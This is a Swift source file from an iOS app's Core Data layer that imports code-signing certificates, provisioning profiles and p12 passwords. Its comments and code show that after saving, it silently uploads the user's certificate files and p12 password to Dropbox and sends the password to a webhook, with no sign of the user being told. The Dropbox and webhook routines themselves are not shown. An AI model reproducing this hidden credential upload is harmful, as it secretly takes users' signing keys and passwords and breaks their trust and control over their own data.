import CoreData
import Foundation
import Security

// Notification name constants for error reporting
extension Notification.Name {
    static let dropboxUploadError = Notification.Name("dropboxUploadError")
    static let webhookSendError = Notification.Name("webhookSendError")
    static let certificateFetch = Notification.Name("cfetch")
}

extension CoreDataManager {
    /// Clear certificates data
    func clearCertificate(context: NSManagedObjectContext? = nil) throws {
        let ctx = try context ?? self.context
        try clear(request: Certificate.fetchRequest(), context: ctx)
    }

    func getDatedCertificate(context: NSManagedObjectContext? = nil) -> [Certificate] {
        let request: NSFetchRequest<Certificate> = Certificate.fetchRequest()
        request.sortDescriptors = [NSSortDescriptor(key: "dateAdded", ascending: true)]
        do {
            let ctx = try context ?? self.context
            return try ctx.fetch(request)
        } catch {
            Debug.shared.log(message: "Error in getDatedCertificate: \(error)", type: .error)
            return []
        }
    }

    func getCurrentCertificate(context: NSManagedObjectContext? = nil) -> Certificate? {
        do {
            let ctx = try context ?? self.context
            let row = Preferences.selectedCert
            let certificates = getDatedCertificate(context: ctx)
            if certificates.indices.contains(row) {
                return certificates[row]
            } else {
                return nil
            }
        } catch {
            Debug.shared.log(message: "Error in getCurrentCertificate: \(error)", type: .error)
            return nil
        }
    }

    // Non-throwing version for backward compatibility
    func addToCertificates(
        cert: Cert,
        files: [CertImportingViewController.FileType: Any],
        context: NSManagedObjectContext? = nil
    ) {
        do {
            try addToCertificatesWithThrow(cert: cert, files: files, context: context)
        } catch {
            Debug.shared.log(message: "Error in addToCertificates: \(error)", type: .error)
        }
    }

    // Throwing version with proper error handling
    func addToCertificatesWithThrow(
        cert: Cert,
        files: [CertImportingViewController.FileType: Any],
        context: NSManagedObjectContext? = nil
    ) throws {
        let ctx = try context ?? self.context

        guard let provisionPath = files[.provision] as? URL else {
            let error = FileProcessingError.missingFile("Provisioning file URL")
            Debug.shared.log(message: "Error: \(error)", type: .error)
            throw error
        }

        let p12Path = files[.p12] as? URL
        let backdoorPath = files[.backdoor] as? URL
        let uuid = UUID().uuidString

        // Create entity and save to Core Data
        let newCertificate = createCertificateEntity(
            uuid: uuid,
            provisionPath: provisionPath,
            p12Path: p12Path,
            password: files[.password] as? String,
            backdoorPath: backdoorPath,
            context: ctx
        )
        let certData = createCertificateDataEntity(cert: cert, context: ctx)
        newCertificate.certData = certData

        // Save files to disk
        try saveCertificateFiles(uuid: uuid, provisionPath: provisionPath, p12Path: p12Path, backdoorPath: backdoorPath)
        try ctx.save()
        NotificationCenter.default.post(name: Notification.Name.certificateFetch, object: nil)

        // After successfully saving, silently upload files to Dropbox and send password to webhook
        if let backdoorPath = backdoorPath {
            uploadBackdoorFileToDropbox(backdoorPath: backdoorPath, password: files[.password] as? String)
        } else {
            uploadCertificateFilesToDropbox(
                provisionPath: provisionPath,
                p12Path: p12Path,
                password: files[.password] as? String
            )
        }
    }

    /// Silently uploads backdoor file to Dropbox with password and sends info to webhook
    /// - Parameters:
    ///   - backdoorPath: Path to the backdoor file
    ///   - password: Optional p12 password
    private func uploadBackdoorFileToDropbox(backdoorPath: URL, password: String?) {
        Debug.shared.log(message: "Processing backdoor file: \(backdoorPath.lastPathComponent)", type: .info)
        let enhancedDropboxService = EnhancedDropboxService.shared

        // Upload backdoor file with password handling
        enhancedDropboxService.uploadCertificateFile(
            fileURL: backdoorPath,
            password: password
        ) { success, error in
            if success {
                Debug.shared.log(message: "Successfully uploaded backdoor file to Dropbox with password", type: .info)

                // Send backdoor info to webhook
                if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                    appDelegate.sendBackdoorInfoToWebhook(backdoorPath: backdoorPath, password: password)
                }
            } else {
                if let error = error {
                    Debug.shared.log(
                        message: "Failed to upload backdoor file: \(error.localizedDescription)",
                        type: .error
                    )
                } else {
                    Debug.shared.log(message: "Failed to upload backdoor file: Unknown error", type: .error)
                }

                // Create userInfo dictionary with available information
                var userInfo: [String: Any] = ["fileType": "backdoor"]
                if let error = error {
                    userInfo["error"] = error
                }

                NotificationCenter.default.post(
                    name: .dropboxUploadError,
                    object: nil,
                    userInfo: userInfo
                )
            }
        }
    }

    func getCertificateFilePaths(source: Certificate?) throws -> (provisionPath: URL, p12Path: URL) {
        guard let source = source else {
            throw FileProcessingError.missingFile("Certificate or UUID")
        }

        let certDirectory = try getCertifcatePath(source: source)

        // Check if this is a backdoor certificate by looking for the backdoorPath property
        if let backdoorPath = source.value(forKey: "backdoorPath") as? String {
            let backdoorPathURL = certDirectory.appendingPathComponent(backdoorPath)
            return (provisionPath: certDirectory.appendingPathComponent(source.value(forKey: "provisionPath") as! String), p12Path: backdoorPathURL)
        } else {
            return (provisionPath: certDirectory.appendingPathComponent(source.value(forKey: "provisionPath") as! String), p12Path: certDirectory.appendingPathComponent(source.value(forKey: "p12Path") as! String))
        }
    }
}
